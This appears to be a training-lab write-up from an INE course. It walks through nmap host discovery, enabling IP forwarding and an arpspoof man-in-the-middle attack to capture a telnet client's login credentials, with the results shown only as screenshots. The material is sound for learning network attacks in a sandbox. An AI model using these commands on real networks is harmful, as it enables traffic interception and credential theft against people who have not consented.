# 🔬ARP Poisoning

## Lab 3 - ARP Poisoning <a href="#lab-3-arp-poisoning" id="lab-3-arp-poisoning"></a>

> 🔬 _INE Platform Lab_
>
> * **ARP Poisoning** attack to a `telnet` server
>   * the client machine authenticates with the `telnet` server every 30sec
> * Find the `telnet` login credentials
> * Tools: **`arpspoof`** & **`Wireshark`**

## Enumeration

```bash
ip a
```

<figure><img src="../../../../.gitbook/assets/image (21) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -sn 10.100.13.0/24  
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap 10.100.13.0/24  
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ARP Poisoining

* Configure the Kali instance to forward IP packets:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

* Perform the ARP poisoning attack

```bash
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36   
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
telnet 10.100.13.36
```

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>







